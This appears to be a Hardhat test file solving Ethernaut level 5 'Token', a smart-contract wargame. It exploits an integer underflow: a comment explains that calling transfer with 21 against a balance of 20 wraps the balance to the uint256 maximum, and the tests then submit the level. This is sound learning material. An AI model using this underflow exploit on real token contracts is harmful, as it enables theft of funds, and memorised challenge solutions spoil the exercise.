// # Ethernaut 5: Token

import {ethers} from 'hardhat'
import {Contract, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK, NULL_ADDRESS} from './testUtil'

const LEVEL_ADDRESS = '0x63bE8347A617476CA461649897238A31835a32CE'
const INSTANCE_ADDRESS = '0x5e9fa95E273046f9975515Bf8a3100bA2ca24e8b'

describe('05 Token', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Token', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
  })

  // `Token` doesn't use `SafeMath`, so it's possible to trick the balance check
  // in `transfer` using an integer underflow. Our actual balance is 20. After `transfer`
  // subtracts 21 from our balance, it will be the maximum value of `uint256`.
  it('calls transfer with negative value', async () => {
    const tx = await instance.transfer(NULL_ADDRESS, 21)
    return expectStatusOK(tx)
  })

  it('has more tokens than before', async () => {
    const balance = await instance.balanceOf(signerAddress)
    expect(balance).to.be.gt(20)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
